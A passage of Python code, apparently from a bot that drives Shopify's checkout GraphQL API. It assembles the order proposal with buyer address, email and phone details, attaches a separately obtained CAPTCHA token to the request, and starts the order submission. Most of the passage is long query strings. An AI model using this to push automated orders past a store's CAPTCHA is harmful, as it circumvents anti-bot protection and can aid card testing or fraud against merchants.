__typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
                'variables': {
                    'sessionInput': {
                        'sessionToken': sst,
                    },
                    'queueToken': queueToken,
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'destination': {
                                    'partialStreetAddress':{
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        },
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': delivery_strategy if delivery_strategy else '',
                                        'customDeliveryRate': False,
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {
                                    'lines': [
                                        {
                                            'stableId': stableId,
                                        },
                                    ],
                                },
                                'deliveryMethodTypes': [
                                    'SHIPPING',
                                ],
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': str(shipping_amount),
                                        'currencyCode': currency,
                                    },
                                },
                                'destinationChanged': False,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stableId,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {
                                    'items': {
                                        'value': 1,
                                    },
                                },
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': subtotal,
                                        'currencyCode': currency,
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'payment': {
                        'totalAmount': {
                            'any': True,
                        },
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress':{
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': currency,
                            'countryCode': 'US',
                        },
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': 'US',
                        'marketingConsent': [
                            {
                                'email': {
                                    'value': email,
                                },
                            },
                        ],
                        'shopPayOptInPhone': {
                            'number': phone,
                            'countryCode': 'US',
                        },
                        'rememberMe': False,
                    },
                    'tip': {
                        'tipLines': [],
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': str(tax_amount),
                                'currencyCode': currency,
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {
                        'fields': [],
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {
                        'buyerRefusesDuties': False,
                    },
                },
                'operationName': 'Proposal',
            }
            
            # Add CAPTCHA token to payment_json if we have one
            if hasattr(self, 'captcha_token') and self.captcha_token:
                payment_json['variables']['captcha'] = {
                    'provider': self.captcha_type.upper() if hasattr(self, 'captcha_type') else 'HCAPTCHA',
                    'token': self.captcha_token,
                }
                if hasattr(self, 'captcha_challenge') and self.captcha_challenge:
                    payment_json['variables']['captcha']['challenge'] = self.captcha_challenge
            
            # STEP 3: SUBMIT FOR COMPLETION
            print(f"[*] Submitting order for completion...")
            
            completion_json = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on 